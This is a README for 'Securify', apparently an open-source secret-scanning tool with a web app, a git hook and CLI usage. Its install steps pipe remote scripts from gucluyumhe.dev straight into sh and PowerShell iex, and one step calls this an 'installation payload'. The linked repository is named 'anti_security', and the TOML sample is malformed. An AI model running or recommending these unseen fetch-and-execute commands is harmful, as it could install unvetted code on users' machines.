# Securify

<p align="center">
  <img src="https://img.shields.io/badge/license-MIT-black?style=flat-round" alt="License" />
  <img src="https://img.shields.io/badge/version-2.4.0-black?style=flat-round" alt="Version" />
  <img src="https://img.shields.io/badge/coverage-100%25-black?style=flat-round" alt="Coverage" />
  <img src="https://img.shields.io/badge/platform-Vite%20%7C%20React%20%7C%20Tailwind-blue?style=flat-round" alt="Platform" />
</p>

**Securify** is an ultra-fast, local-first open-source security suite designed to inspect codebase changes, audit custom regex signatures, generate secure tokens, and prevent API keys, database credentials, and cloud tokens from leaking to public version control systems.

This repository contains the interactive **Securify Web Application** along with the core documentation for the CLI scanning tool.

---

## Web Application Features

The interactive web interface is designed with a premium dark-mode developer aesthetic and offers the following features:

- **Interactive Sandbox & CSPRNG Generator**: Generate cryptographically secure secrets with configurable lengths, character sets, and custom signature prefixes (e.g., `sk_live_`, `sec_key_`). Includes real-time Shannon Entropy computation and brute-force cracking estimates.
- **Custom Rule Tester & YAML Generator**: Test custom regular expressions (Regex) against raw code payloads. Validates regex syntax and generates ready-to-use `.securify.toml` rule configurations.
- **Live Hook Security Simulator**: Paste code fragments to test the engine's built-in detection rules. Simulates commit blockage and displays precise matched tokens, line offsets, and rule severities.
- **Signature Database (Rules Reference)**: Browse built-in security signatures (AWS, Supabase, Stripe, GCP, GitHub PATs, Slack Webhooks, etc.) with detailed description codes.
- **Secure Telemetry Relay**: Send secure encrypted feedback and integration queries directly to the core development team.

---

## Installation

### macOS / Linux
Install the securify CLI locally using our automated curl script hosted on the secure gateway:
```bash
curl -fsSL https://gucluyumhe.dev/install.sh | sh
```

### Windows (PowerShell)
Execute the installation payload via PowerShell:
```powershell
iwr -useb https://gucluyumhe.dev/install.ps1 | iex
```

---

## Usage Guide

### 1. Initialize Git Hook
Configure securify as a pre-commit intercept hook in your active git repository:
```bash
securify init-hook
```
This adds a hook trigger file under `.git/hooks/pre-commit` that automatically scans files added to the staging area before every commit.

### 2. Manual Directory Scan
Scan any directory or file manually at any time:
```bash
securify scan .
```

### 3. List Active Rules
View all scanning patterns loaded in the signature database:
```bash
securify rules
```

---

## Configuration

Customize the parser settings using a `securify.toml` file at the root of your project:

```toml
[scanner]
entropy_threshold = 4.5
max_file_size_mb = 10

[exclude]
paths = [
  "node_modules/**",
  "dist/**",
  "tests/mocks/**"
]

[custom_rules]
- name = "custom-jwt-claims"
- regex = "jwt_token_[a-zA-Z0-9]{32}"
- severity = "high"
```

### Bypassing Secrets

To bypass security filters for tests or development environment mocks, append a `# securify:ignore` comment to the end of the line containing the key:

```typescript
const testApiKey = "sk_test_51N34ghJkL90AcdSfErtYuiOp"; // securify:ignore
```

---

## Repository & License

- **GitHub Repository**: [sandrotonal/anti_security](https://github.com/sandrotonal/anti_security)
- **Official URL**: [gucluyumhe.dev](https://gucluyumhe.dev)
- **License**: MIT License. Feel free to use, modify, and contribute.
